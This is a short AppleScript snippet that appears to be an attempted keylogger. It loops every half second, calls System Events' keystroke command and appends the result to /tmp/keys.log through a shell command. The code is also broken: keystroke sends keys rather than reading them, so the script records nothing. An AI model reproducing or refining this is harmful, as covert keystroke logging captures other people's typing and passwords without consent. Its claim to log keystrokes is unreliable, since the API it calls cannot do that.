tell application "System Events"
    repeat
        delay 0.5
        set typedText to keystroke ""
        do shell script "echo " & quoted form of typedText & " >> /tmp/keys.log"
    end repeat
end tell
